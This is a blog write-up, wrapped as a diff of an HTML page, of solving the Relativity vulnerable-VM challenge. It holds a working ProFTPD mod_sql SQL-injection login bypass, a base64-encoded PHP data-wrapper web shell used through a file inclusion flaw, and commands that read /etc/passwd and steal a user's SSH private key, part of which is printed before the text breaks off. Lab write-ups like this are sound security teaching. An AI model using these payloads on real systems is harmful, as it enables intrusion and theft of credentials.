@@ -1,0 +1,755 @@
+<!DOCTYPE html>
+<html lang="en-us">
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <title> slash root slash flag dot txt Solving the Relativity Vulnerable VM | #!/slash/note</title>
+  <meta name="description" content="[&#39;Caffeine fueled&#39;, &#39;(╯°□°)╯︵ ┻━┻&#39;, &#39;Security guy&#39;, &#39;Metalhead&#39;, &#39;I saw your password&#39;, &#39;KOOBo&#43;KXleKAv&#43;KXlSnjgaM=&#39;]">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="robots" content="all,follow">
+  <meta name="googlebot" content="index,follow,snippet,archive">
+  <meta property="og:title" content="slash root slash flag dot txt Solving the Relativity Vulnerable VM" />
+<meta property="og:description" content="foreword
+At the time of writing this post, this VM was part of a local security communities (zacon) pre-con challenge. Finding /root/flag.txt would have entered you into a draw for winning a prize :D However, the greater goal of the challenge was to learn something. I set out some time and attempted the challenge. Fortunately, I managed to complete it in time. So, this is the journey I took to solve this. You can now download and try this VM yourself over at VulnHub. Unzip, mount and boot the VM. Once the VM is booted, it should have an IP assigned via DHCP.
+I think it is interesting to note that I used a very limited set of tools to complete this. No bruteforcers, metasploits, vulnerability scanners and or fancy proxies were used. My toolset consisted out of netcat, nmap and other basic bash commands. There are probably a gazillion ways to do this as lots of this stuff is preference based on how they are approached. However, the basic ideas of the vulnerabilities remain the same." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://leonjza.github.io/posts/2013-11-18-slash-root-slash-flag-dot-txt-solving-the-relativity-vulnerable-vm/" />
+<meta property="article:published_time" content="2013-11-18T00:00:00+00:00" />
+<meta property="article:modified_time" content="2013-11-18T00:00:00+00:00" />
+
+  <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="slash root slash flag dot txt Solving the Relativity Vulnerable VM"/>
+<meta name="twitter:description" content="foreword
+At the time of writing this post, this VM was part of a local security communities (zacon) pre-con challenge. Finding /root/flag.txt would have entered you into a draw for winning a prize :D However, the greater goal of the challenge was to learn something. I set out some time and attempted the challenge. Fortunately, I managed to complete it in time. So, this is the journey I took to solve this. You can now download and try this VM yourself over at VulnHub. Unzip, mount and boot the VM. Once the VM is booted, it should have an IP assigned via DHCP.
+I think it is interesting to note that I used a very limited set of tools to complete this. No bruteforcers, metasploits, vulnerability scanners and or fancy proxies were used. My toolset consisted out of netcat, nmap and other basic bash commands. There are probably a gazillion ways to do this as lots of this stuff is preference based on how they are approached. However, the basic ideas of the vulnerabilities remain the same."/>
+
+  
+  
+  
+  <link rel="stylesheet" href="https://leonjza.github.io/css/style-white.css">
+  
+  
+  
+    <!--[if lt IE 9]>
+      <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
+      <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
+    <![endif]-->
+  
+
+  
+<link rel="icon" type="image/png" href="https://leonjza.github.io/images/favicon.png" />
+
+  
+  
+  
+  
+  
+    
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+	ga('create', 'UA-44457032-2', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+<script async src='https://www.google-analytics.com/analytics.js'></script>
+
+  
+  
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+  <div class="content index py4">
+
+  <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+        <li><a href="https://leonjza.github.io/">Home</a></li>
+         
+        <li><a href="https://leonjza.github.io/about/">About Me</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li>
+          <a class="icon" href=" https://leonjza.github.io/posts/2013-09-23-zeus-my-adventure-with-a-infamous-bot/">
+            <i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i>
+          </a>
+        </li>
+        
+        
+        <li>
+          <a class="icon" href="https://leonjza.github.io/posts/2014-03-11-dnsfilexfer-yet-another-take-on-file-transfer-via-dns/">
+            <i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i>
+          </a>
+        </li>
+        
+        <li>
+          <a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');">
+            <i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i>
+          </a>
+        </li>
+        <li>
+          <a class="icon" href="#">
+            <i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i>
+          </a>
+        </li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      
+      <ul>
+  
+  
+    
+  
+  
+  <li>
+    <a class="icon" href="http://www.facebook.com/sharer.php?u=https%3a%2f%2fleonjza.github.io%2fposts%2f2013-11-18-slash-root-slash-flag-dot-txt-solving-the-relativity-vulnerable-vm%2f">
+      <i class="fab fa-facebook " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://twitter.com/share?url=https%3a%2f%2fleonjza.github.io%2fposts%2f2013-11-18-slash-root-slash-flag-dot-txt-solving-the-relativity-vulnerable-vm%2f&text=slash%20root%20slash%20flag%20dot%20txt%20Solving%20the%20Relativity%20Vulnerable%20VM">
+      <i class="fab fa-twitter " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://www.linkedin.com/shareArticle?url=https%3a%2f%2fleonjza.github.io%2fposts%2f2013-11-18-slash-root-slash-flag-dot-txt-solving-the-relativity-vulnerable-vm%2f&title=slash%20root%20slash%20flag%20dot%20txt%20Solving%20the%20Relativity%20Vulnerable%20VM">
+      <i class="fab fa-linkedin " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https%3a%2f%2fleonjza.github.io%2fposts%2f2013-11-18-slash-root-slash-flag-dot-txt-solving-the-relativity-vulnerable-vm%2f&is_video=false&description=slash%20root%20slash%20flag%20dot%20txt%20Solving%20the%20Relativity%20Vulnerable%20VM">
+      <i class="fab fa-pinterest " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="mailto:?subject=slash%20root%20slash%20flag%20dot%20txt%20Solving%20the%20Relativity%20Vulnerable%20VM&body=Check out this article: https%3a%2f%2fleonjza.github.io%2fposts%2f2013-11-18-slash-root-slash-flag-dot-txt-solving-the-relativity-vulnerable-vm%2f">
+      <i class="fas fa-envelope " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://getpocket.com/save?url=https%3a%2f%2fleonjza.github.io%2fposts%2f2013-11-18-slash-root-slash-flag-dot-txt-solving-the-relativity-vulnerable-vm%2f&title=slash%20root%20slash%20flag%20dot%20txt%20Solving%20the%20Relativity%20Vulnerable%20VM">
+      <i class="fab fa-get-pocket " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://reddit.com/submit?url=https%3a%2f%2fleonjza.github.io%2fposts%2f2013-11-18-slash-root-slash-flag-dot-txt-solving-the-relativity-vulnerable-vm%2f&title=slash%20root%20slash%20flag%20dot%20txt%20Solving%20the%20Relativity%20Vulnerable%20VM">
+      <i class="fab fa-reddit " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://www.stumbleupon.com/submit?url=https%3a%2f%2fleonjza.github.io%2fposts%2f2013-11-18-slash-root-slash-flag-dot-txt-solving-the-relativity-vulnerable-vm%2f&title=slash%20root%20slash%20flag%20dot%20txt%20Solving%20the%20Relativity%20Vulnerable%20VM">
+      <i class="fab fa-stumbleupon " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://digg.com/submit?url=https%3a%2f%2fleonjza.github.io%2fposts%2f2013-11-18-slash-root-slash-flag-dot-txt-solving-the-relativity-vulnerable-vm%2f&title=slash%20root%20slash%20flag%20dot%20txt%20Solving%20the%20Relativity%20Vulnerable%20VM">
+      <i class="fab fa-digg " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://www.tumblr.com/share/link?url=https%3a%2f%2fleonjza.github.io%2fposts%2f2013-11-18-slash-root-slash-flag-dot-txt-solving-the-relativity-vulnerable-vm%2f&name=slash%20root%20slash%20flag%20dot%20txt%20Solving%20the%20Relativity%20Vulnerable%20VM&description=%3ch2%20id%3d%22foreword%22%3eforeword%3c%2fh2%3e%0a%3cp%3eAt%20the%20time%20of%20writing%20this%20post%2c%20this%20VM%20was%20part%20of%20a%20local%20security%20communities%20%28%3ca%20href%3d%22http%3a%2f%2fzacon.org.za%2f%22%3ezacon%3c%2fa%3e%29%20pre-con%20challenge.%20Finding%20%2froot%2fflag.txt%20would%20have%20entered%20you%20into%20a%20draw%20for%20winning%20a%20prize%20%3aD%20However%2c%20the%20greater%20goal%20of%20the%20challenge%20was%20to%20learn%20something.%20I%20set%20out%20some%20time%20and%20attempted%20the%20challenge.%20Fortunately%2c%20I%20managed%20to%20complete%20it%20in%20time.%20So%2c%20this%20is%20the%20journey%20I%20took%20to%20solve%20this.%20You%20can%20now%20download%20and%20try%20this%20VM%20yourself%20over%20at%20%3ca%20href%3d%22http%3a%2f%2fvulnhub.com%2fentry%2fdevrandom_relativity%2c55%2f%22%3eVulnHub%3c%2fa%3e.%20Unzip%2c%20mount%20and%20boot%20the%20VM.%20Once%20the%20VM%20is%20booted%2c%20it%20should%20have%20an%20IP%20assigned%20via%20DHCP.%3c%2fp%3e%0a%3cp%3eI%20think%20it%20is%20interesting%20to%20note%20that%20I%20used%20a%20very%20limited%20set%20of%20tools%20to%20complete%20this.%20No%20bruteforcers%2c%20metasploits%2c%20vulnerability%20scanners%20and%20or%20fancy%20proxies%20were%20used.%20My%20toolset%20consisted%20out%20of%20netcat%2c%20nmap%20and%20other%20basic%20bash%20commands.%20There%20are%20probably%20a%20gazillion%20ways%20to%20do%20this%20as%20lots%20of%20this%20stuff%20is%20preference%20based%20on%20how%20they%20are%20approached.%20However%2c%20the%20basic%20ideas%20of%20the%20vulnerabilities%20remain%20the%20same.%3c%2fp%3e">
+      <i class="fab fa-tumblr " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fleonjza.github.io%2fposts%2f2013-11-18-slash-root-slash-flag-dot-txt-solving-the-relativity-vulnerable-vm%2f&t=slash%20root%20slash%20flag%20dot%20txt%20Solving%20the%20Relativity%20Vulnerable%20VM">
+      <i class="fab fa-hacker-news " aria-hidden="true"></i>
+    </a>
+  </li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#foreword">foreword</a>
+      <ul>
+        <li><a href="#the-challenge">the challenge</a></li>
+        <li><a href="#initial-enumeration">initial enumeration</a>
+          <ul>
+            <li><a href="#putting-the-enumeration-together">putting the enumeration together</a></li>
+          </ul>
+        </li>
+        <li><a href="#the-initial-attack">the initial attack</a></li>
+        <li><a href="#web-based-attack">web based attack</a></li>
+        <li><a href="#exploiting-the-web-based-vulnerability">exploiting the web based vulnerability</a></li>
+        <li><a href="#gaining-further-access">gaining further access</a></li>
+        <li><a href="#enumerating-the-next-step">enumerating the next step</a></li>
+        <li><a href="#good-ol-irc">good &lsquo;ol irc</a></li>
+        <li><a href="#the-shortest-straw">the shortest straw</a></li>
+        <li><a href="#finishing-off">finishing off</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+    </div>
+  </span>
+</div>
+
+
+  <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+    <header>
+      <h1 class="posttitle" itemprop="name headline">
+        slash root slash flag dot txt Solving the Relativity Vulnerable VM
+      </h1>
+      <div class="meta">
+        
+        <div class="postdate">
+          
+          <time datetime="2013-11-18 00:00:00 &#43;0000 UTC" itemprop="datePublished">2013-11-18</time>
+          
+        </div>
+        
+        <div class="article-category">
+            <i class="fas fa-archive"></i>
+            
+            
+            <a class="category-link" href="https://leonjza.github.io/categories/vulnerable-vm">Vulnerable VM</a>
+            
+             ,  
+            <a class="category-link" href="https://leonjza.github.io/categories/solution">Solution</a>
+            
+             ,  
+            <a class="category-link" href="https://leonjza.github.io/categories/challenge">Challenge</a>
+            
+             ,  
+            <a class="category-link" href="https://leonjza.github.io/categories/zacon">Zacon</a>
+            
+        </div>
+        
+        
+      </div>
+    </header>
+
+  
+    <div class="content" itemprop="articleBody">
+      <h2 id="foreword">foreword</h2>
+<p>At the time of writing this post, this VM was part of a local security communities (<a href="http://zacon.org.za/">zacon</a>) pre-con challenge. Finding /root/flag.txt would have entered you into a draw for winning a prize :D However, the greater goal of the challenge was to learn something. I set out some time and attempted the challenge. Fortunately, I managed to complete it in time. So, this is the journey I took to solve this. You can now download and try this VM yourself over at <a href="http://vulnhub.com/entry/devrandom_relativity,55/">VulnHub</a>. Unzip, mount and boot the VM. Once the VM is booted, it should have an IP assigned via DHCP.</p>
+<p>I think it is interesting to note that I used a very limited set of tools to complete this. No bruteforcers, metasploits, vulnerability scanners and or fancy proxies were used. My toolset consisted out of netcat, nmap and other basic bash commands. There are probably a gazillion ways to do this as lots of this stuff is preference based on how they are approached. However, the basic ideas of the vulnerabilities remain the same.</p>
+<h3 id="the-challenge">the challenge</h3>
+<p>It all started with an announcement on the Zacon mailing list. A friendly heads-up about the challenge and some details were made available. We were given a hostname of where the challenge lived with clear instructions to find <code>flag.txt</code>. Sounds simple. I slapped the hostname as a url in a browser and was met with a image of M.C. Eshter&rsquo;s &lsquo;Relativity&rsquo;. Great. Something to start thinking about. I also nmapped the box. I mean, how else would you start, right? :)</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#6272a4"># 192.168.56.21 Nmap</span>
+Nmap scan report <span style="color:#ff79c6">for</span> 192.168.56.21 <span style="color:#ff79c6">(</span>192.168.56.21<span style="color:#ff79c6">)</span>
+Host is up <span style="color:#ff79c6">(</span>0.0024s latency<span style="color:#ff79c6">)</span>.
+Not shown: <span style="color:#bd93f9">997</span> filtered ports
+PORT   STATE SERVICE
+21/tcp open  ftp
+22/tcp open  ssh
+80/tcp open  http
+</code></pre></div><p>Alright. This gives you a good idea of whats happening on the host, as well as some points to start off with.</p>
+<h3 id="initial-enumeration">initial enumeration</h3>
+<p>Enumeration is key to starting something like this. The more you know about the host, the more you are able to adapt and think about as you go through the challenge. So, we know we have a SSH Server, a FTP server and a Web server exposed.</p>
+<p>Starting with the SSH server, I tried to check if password based authentication was on. Maybe Mr MC Eshter had an account on this box? You never know :)</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ ssh eshter@192.168.56.21
+Permission denied <span style="color:#ff79c6">(</span>publickey<span style="color:#ff79c6">)</span>.
+</code></pre></div><p>So, we now know only key based authentication works. Thats fine. Next up was the FTP service.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ ftp 192.168.56.21
+Connected to 192.168.56.21.
+<span style="color:#bd93f9">220</span> Welcome to Relativity FTP <span style="color:#ff79c6">(</span>mod_sql<span style="color:#ff79c6">)</span>
+Name <span style="color:#ff79c6">(</span>192.168.56.21:root<span style="color:#ff79c6">)</span>: anonymous
+<span style="color:#bd93f9">331</span> Password required <span style="color:#ff79c6">for</span> anonymous.
+Password:
+<span style="color:#bd93f9">530</span> Login incorrect.
+Login failed.
+Remote system <span style="color:#8be9fd;font-style:italic">type</span> is UNIX.
+Using binary mode to transfer files.
+ftp&gt;
+</code></pre></div><p>No anonymous FTP logins either. It appears that the Server&rsquo;s FTP banner has been customised and is maybe using the mod_sql plugin. A quick Google for mod_sql revealed that this may be ProFTPD with the mod_sql plugin. Great. This is an important piece of information. To complete the enumeration I moved on to the web server. It was time to inspect some request responses.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">$ curl -v 192.168.56.21
+* About to connect() to 192.168.56.21 port 80 (#0)
+*   Trying 192.168.56.21...
+* connected
+* Connected to 192.168.56.21 (192.168.56.21) port 80 (#0)
+&gt; GET / HTTP/1.1
+&gt; User-Agent: curl/7.26.0
+&gt; Host: 192.168.56.21
+&gt; Accept: */*
+&gt;
+* additional stuff not fine transfer.c:1037: 0 0
+* HTTP 1.1 or later with persistent connection, pipelining supported
+&lt; HTTP/1.1 200 OK
+&lt; Date: Sat, 28 Sep 2013 23:12:28 GMT
+&lt; Server: Apache/2.2.23 (Fedora)
+&lt; Last-Modified: Tue, 05 Mar 2013 03:24:29 GMT
+&lt; ETag: &#34;4ecb-82-4d72502eec502&#34;
+&lt; Accept-Ranges: bytes
+&lt; Content-Length: 130
+&lt; Connection: close
+&lt; Content-Type: text/html; charset=UTF-8
+&lt;
+&lt;html&gt;
+&lt;head&gt;&lt;title&gt;M.C. Escher - Relativity&lt;/title&gt;&lt;/head&gt;
+&lt;body&gt;
+&lt;/br&gt;
+&lt;center&gt;&lt;img src=&#34;artwork.jpg&#34;&gt;&lt;/center&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+* Closing connection #0
+</code></pre></div><h4 id="putting-the-enumeration-together">putting the enumeration together</h4>
+<p>With the little bit of poking around we have just done, we are able to say that this may be a Fedora Core Server, running Apache 2.2.13, with ProFTPD and the mod_sql plugin. This already gives us quite a lot to work with in the sense of researching the respective software in search of known vulnerabilities.</p>
+<p>With me loving web based security, my first attempt at further enumerating the machine was via the web server. I searched for <code>cgi-bin/</code> type problems, potentially hidden directories via <code>robots.txt</code>, username enumeration via home directories etc. to no avail. At some stage it became very apparent that the initial entry point for this server was not via the Web.</p>
+<h3 id="the-initial-attack">the initial attack</h3>
+<p>The next step was the FTP server. As it was purposely disclosing the fact that it was using mod_sql, instinct kicked in and I attempted to check the responses if I tried to login with username <strong>'</strong> and password <strong>'</strong>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#6272a4"># ftp 192.168.56.21</span>
+Connected to 192.168.56.21.
+<span style="color:#bd93f9">220</span> Welcome to Relativity FTP <span style="color:#ff79c6">(</span>mod_sql<span style="color:#ff79c6">)</span>
+Name <span style="color:#ff79c6">(</span>192.168.56.21:root<span style="color:#ff79c6">)</span>: <span style="color:#f1fa8c">&#39;
+</span><span style="color:#f1fa8c">331 Password required for &#39;</span>.
+Password:
+<span style="color:#bd93f9">421</span> Service not available, remote server has closed connection
+Login failed.
+No control connection <span style="color:#ff79c6">for</span> command: Success
+ftp&gt;
+</code></pre></div><p>As you can clearly see, the response does differ from when I initially attempted to login as anonymous. This highly suggests that one of the fields is SQL injectable. And so, it was research time. Using good &lsquo;ol trusty Google, I searched for <em>proftpd mod_sql injection vulnerability</em>. Hey presto! The very first hit describes a vulnerability <a href="http://www.securityfocus.com/bid/33722">disclosed</a> in 2009.</p>
+<p>From this research, we can be pretty confident in thinking that this specific FTP server may as well be vulnerable to the exact same vulnerability, and may very well be our first entry point into the system. Sample exploits are available <a href="http://www.securityfocus.com/bid/33722/exploit">here</a>, and as such I attempted to exploit this. I copied the SQLi payload from the website <code>%') and 1=2 union select 1,1,uid,gid,homedir,shell from users; --</code> and pasted this as the username, whereafter I provided 1 as the password.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#6272a4"># ftp 192.168.56.21</span>
+Connected to 192.168.56.21.
+<span style="color:#bd93f9">220</span> Welcome to Relativity FTP <span style="color:#ff79c6">(</span>mod_sql<span style="color:#ff79c6">)</span>
+Name <span style="color:#ff79c6">(</span>192.168.56.21:root<span style="color:#ff79c6">)</span>: %<span style="color:#f1fa8c">&#39;) and 1=2 union select 1,1,uid,gid,homedir,shell from users; --
+</span><span style="color:#f1fa8c">331 Password required for %&#39;</span><span style="color:#ff79c6">)</span>.
+Password:
+<span style="color:#bd93f9">421</span> Service not available, remote server has closed connection
+Login failed.
+No control connection <span style="color:#ff79c6">for</span> command: Success
+ftp&gt; bye
+</code></pre></div><p>No dice. :| Ok, well I guess I couldn&rsquo;t have expected it to be <em>that</em> easy. This caused me to dig even deeper and research exactly what the problem is, and why this vulnerability exists. Eventually, I got hold of a vulnerable version of the software, set it up in a LAB VM, and tested the SQLi payload until it worked. I ended up with a slightly different payload to the ones available online.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#6272a4"># ftp 192.168.56.21</span>
+Connected to 192.168.56.21.
+<span style="color:#bd93f9">220</span> Welcome to Relativity FTP <span style="color:#ff79c6">(</span>mod_sql<span style="color:#ff79c6">)</span>
+Name <span style="color:#ff79c6">(</span>192.168.56.21:root<span style="color:#ff79c6">)</span>: %<span style="color:#f1fa8c">&#39;) and 1=2 union select 1,1,uid,gid,homedir,shell from users;#
+</span><span style="color:#f1fa8c">331 Password required for %&#39;</span><span style="color:#ff79c6">)</span>.
+Password:
+<span style="color:#bd93f9">230</span> User %&#39;<span style="color:#ff79c6">)</span> and <span style="color:#8be9fd;font-style:italic">1</span><span style="color:#ff79c6">=</span><span style="color:#bd93f9">2</span> union <span style="color:#ff79c6">select</span> 1,1,uid,gid,homedir,shell from users;<span style="color:#6272a4"># logged in.</span>
+Remote system <span style="color:#8be9fd;font-style:italic">type</span> is UNIX.
+Using binary mode to transfer files.
+ftp&gt;
+</code></pre></div><p>w00t. Notice the difference though? The SQL commenting was changed from &ndash; to #. Apparently, MySQL is pretty finicky about the fact that the &ndash; style comments should have a space afterwards. This means that a payload ending with say, <code>from users; -- NOTHING_OF_VALUE</code> would have worked too. Just putting a space after the &ndash; did not work as the software most probably does a type of <code>trim()</code> on the field, hence the need to have something after the space too. Awesome, something learnt.</p>
+<h3 id="web-based-attack">web based attack</h3>
+<p>Now that we have FTP access to the host, we simply needed to <code>ls</code> to learn what is the next step.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ftp&gt; ls
+<span style="color:#bd93f9">200</span> PORT <span style="color:#8be9fd;font-style:italic">command</span> successful
+<span style="color:#bd93f9">150</span> Opening ASCII mode data connection <span style="color:#ff79c6">for</span> file list
+drwxr-xr-x   <span style="color:#bd93f9">3</span> root     root         <span style="color:#bd93f9">4096</span> Mar  <span style="color:#bd93f9">5</span>  <span style="color:#bd93f9">2013</span> 0f756638e0737f4a0de1c53bf8937a08
+-rw-r--r--   <span style="color:#bd93f9">1</span> root     root       <span style="color:#bd93f9">235423</span> Mar  <span style="color:#bd93f9">5</span>  <span style="color:#bd93f9">2013</span> artwork.jpg
+-rw-r--r--   <span style="color:#bd93f9">1</span> root     root          <span style="color:#bd93f9">130</span> Mar  <span style="color:#bd93f9">5</span>  <span style="color:#bd93f9">2013</span> index.html
+<span style="color:#bd93f9">226</span> Transfer complete.
+ftp&gt; <span style="color:#8be9fd;font-style:italic">cd</span> 0f756638e0737f4a0de1c53bf8937a08
+<span style="color:#bd93f9">550</span> 0f756638e0737f4a0de1c53bf8937a08: Permission denied
+ftp&gt;
+</code></pre></div><p>A directory called &lsquo;0f756638e0737f4a0de1c53bf8937a08&rsquo; was present, however our FTP user does not have access to this. We are able to deduce that this is in the web folder based on the content of the directory we have access to. So, time to slap http://192.16.56.21/0f756638e0737f4a0de1c53bf8937a08 into a web browser.</p>
+<h3 id="exploiting-the-web-based-vulnerability">exploiting the web based vulnerability</h3>
+<p>Browsing to the above mentioned URL revealed a PHP driven website filled with information about the Relativity artwork. While this in itself was interesting, the real interest was in the url&rsquo;s to different parts of the website. More specifically, the urls were composed as <code>index.php?page=definition.php</code>. Immediately this suggested that the file <code>index.php</code> was programmed to include other files in order to render the content. In the examples case it included definition.php.</p>
+<p>My first attempts to exploit this was very successful. For this kind of potential vulnerability, I have a small PHP <a href="http://php.net/manual/en/wrappers.data.php">data stream wrapper</a> shell in my toolbox. Normally, the shell looks something like this:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#ff79c6">?</span>file<span style="color:#ff79c6">=</span>data<span style="color:#ff79c6">:</span>,<span style="color:#ff79c6">&lt;?</span>php system(<span style="color:#8be9fd;font-style:italic">$_GET</span>[c]); <span style="color:#ff79c6">?&gt;</span>&amp;c=ls
+</code></pre></div><p>Sometimes however, sites tend to attempt to filter out certain PHP commands. So, in order to increase the chances of success, a base64 encoded version ends up being my favourite:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#ff79c6">?</span>file<span style="color:#ff79c6">=</span>data<span style="color:#ff79c6">:</span>;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NdKTsgPz4<span style="color:#ff79c6">=&amp;</span>c<span style="color:#ff79c6">=</span>dir
+</code></pre></div><p>I used this and now had shell access to the box. Remembering the basic tips of enumerate-&gt;exploit-&gt;post-exploit, I ran a few simple commands, just to get a better feel for the environment that I was facing. I was using Google Chrome. If you add &lsquo;view-source:&rsquo; to the front of a url, or right click-&gt; view source, then you will see the output for your command shell in a much neater and easier to read layout. I ran the commands <code>id; uname -a; sestatus; pwd; ls -lah /home; cat /etc/passwd</code>:</p>
+<figure>
+    <img src="https://leonjza.github.io/images/relativity_command_injection.png"/> 
+</figure>
+
+<p>From this we know that the server is running Fedora Core 17, with the 3.9.8-100 kernel. SELinux is disabled. There are 2 users with /home directories, of which <code>jetta</code>&rsquo;s directory is protected from me reading it at the moment. root, mauk and jetta all have valid logins shells too.</p>
+<p>Taking one quick step back, I investigated the sources of the website in order to maybe find some credentials that may attach this website to a database or something similarly useful. While doing this, I noticed the index.php page was in fact doing partial input validation, which may cause some web shells not to work :)</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#8be9fd;font-style:italic">$blacklist_include</span><span style="color:#ff79c6">=</span><span style="color:#ff79c6">array</span>(<span style="color:#f1fa8c">&#34;php://&#34;</span>);
+<span style="color:#ff79c6">for</span> (<span style="color:#8be9fd;font-style:italic">$i</span><span style="color:#ff79c6">=</span><span style="color:#bd93f9">0</span>; <span style="color:#8be9fd;font-style:italic">$i</span><span style="color:#ff79c6">&lt;</span>count(<span style="color:#8be9fd;font-style:italic">$blacklist_include</span>); <span style="color:#8be9fd;font-style:italic">$i</span><span style="color:#ff79c6">++</span>){
+         <span style="color:#ff79c6">if</span> (strpos(<span style="color:#8be9fd;font-style:italic">$_GET</span>[<span style="color:#f1fa8c">&#39;page&#39;</span>],<span style="color:#8be9fd;font-style:italic">$blacklist_include</span>[<span style="color:#8be9fd;font-style:italic">$i</span>]) <span style="color:#ff79c6">!==</span> <span style="color:#ff79c6">false</span>){
+                <span style="color:#ff79c6">die</span>();
+        }
+}
+<span style="color:#8be9fd;font-style:italic">$page</span> <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">$_GET</span>[<span style="color:#f1fa8c">&#39;page&#39;</span>];
+<span style="color:#ff79c6">include</span> (<span style="color:#8be9fd;font-style:italic">$page</span>);
+</code></pre></div><h3 id="gaining-further-access">gaining further access</h3>
+<p>From here you can of course take the time to set yourself up with a very nice interactive shell using this web based remote file inclusion vulnerability. However, browsing around the file system its clear that you can browse in the user <code>mauk</code>&rsquo;s home directory. While the directory itself has nothing of real value, there are still the hidden directories to view. Usually, these include things such as the users bash_history, bashrc etc. Also, ssh key related information would typically reside inside .ssh/. In this users .ssh/ directory, he left he’s SSH private key there, with permissions set so that anyone can read it. So, using the web based remote file include shell we are able to steal this off the server with the command <code>cat /home/mauk/.ssh/id_rsa</code>, which would echo us the key.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">-----BEGIN RSA PRIVATE KEY-----
+MIIEpAIBAAKCAQEA5sm/rHHoCaTtncp7DCSIJlWnUg9eyfpJ3czIn18U1lv5ZQf0
+9yGaDxafualdpXCNMo32mVQb9XQ7c2N7sdSdAjsgSjV0YG/IZGZNRyFS58YJQRdZ
+5wRu6eKAlQVss/Lq3zwuBsT8Om/1/cKpVgB3ukPtKA97M5iSxL1VWWXg6GVoJ6f6
